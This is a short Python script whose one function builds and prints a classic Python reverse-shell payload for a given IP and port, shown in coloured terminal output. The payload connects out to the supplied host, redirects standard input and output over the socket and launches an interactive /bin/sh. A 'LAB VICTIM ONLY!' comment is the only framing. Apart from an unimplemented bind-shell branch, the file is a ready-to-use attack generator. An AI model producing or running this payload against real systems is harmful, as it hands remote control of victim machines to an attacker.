from termcolor import colored

def generate_payload(shell_type, ip, port):
    if shell_type == "reverse":
        code = f"""
# Python reverse shell - LAB VICTIM ONLY!
import socket,subprocess,os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}", {port}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
"""
        print(colored(code.strip(), "green"))
        print(colored(f"[+] Reverse shell generated for {ip}:{port}", "cyan"))
    else:
        print(colored("[!] Bind not implemented yet", "red"))